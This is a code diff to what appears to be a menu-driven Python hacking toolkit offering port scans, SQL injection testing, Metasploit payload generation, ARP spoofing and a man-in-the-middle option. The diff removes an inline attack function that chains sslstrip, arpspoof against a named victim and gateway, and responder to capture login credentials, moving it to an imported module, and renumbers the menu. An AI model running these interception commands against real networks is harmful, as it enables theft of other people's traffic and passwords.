@@ -1,10 +1,10 @@
 # Import necessary modules
 import os
-import subprocess
 import sys
 import nmap
 import base64
 import zlib
+from mitm import *
 
 
 # Define function to scan for open ports on a given IP address
@@ -105,19 +105,6 @@ def arp():
 
 
 # Define function to perform a man-in-the-middle attack
-def mitm():
-    print("MITM attack...")
-    # Get the victim's IP address and the gateway's IP address
-    victim_ip = input("Enter victim IP: ")
-    gateway_ip = input("Enter gateway IP: ")
-    # Get the name of the network interface to use
-    interface = input("Enter Interface of connection: ")
-    # Start sslstrip
-    subprocess.call(['sslstrip'])
-    # Use arpspoof to perform ARP spoofing
-    subprocess.call(['arpspoof', '-i', 'eth0', '-t', victim_ip, gateway_ip])
-    # Use responder to capture authentication credentials
-    subprocess.call(f"responder -I  {interface} -P -F -d -b ")
 
 
 # Define function to display the main menu
@@ -128,11 +115,10 @@ def menu():
         print("2. Directory Busting")
         print("3. SQLInjection Testing")
         print("4. Web Server Scanning with Nikto")
-        print("5. Web Server Scanning with Nuclei")
-        print("6. Generate Metasploit Payload")
-        print("7. ARP Spoofing")
-        print("8. Man-in-the-Middle Attack")
-        print("9. Exit\n")
+        print("5. Generate Metasploit Payload")
+        print("6. ARP Spoofing")
+        print("7. Man-in-the-Middle Attack")
+        print("8. Exit\n")
         # Get the user's choice
         choice = input("Enter your choice: ")
         # Call the appropriate function based on the user's choice
@@ -146,14 +132,12 @@ def menu():
         elif choice == '4':
             nikto()
         elif choice == '5':
-            nuclei()
-        elif choice == '6':
             msfvenom()
-        elif choice == '7':
+        elif choice == '6':
             arp()
-        elif choice == '8':
+        elif choice == '7':
             mitm()
-        elif choice == '9':
+        elif choice == '8':
             print("Exiting...")
             sys.exit()
         else:
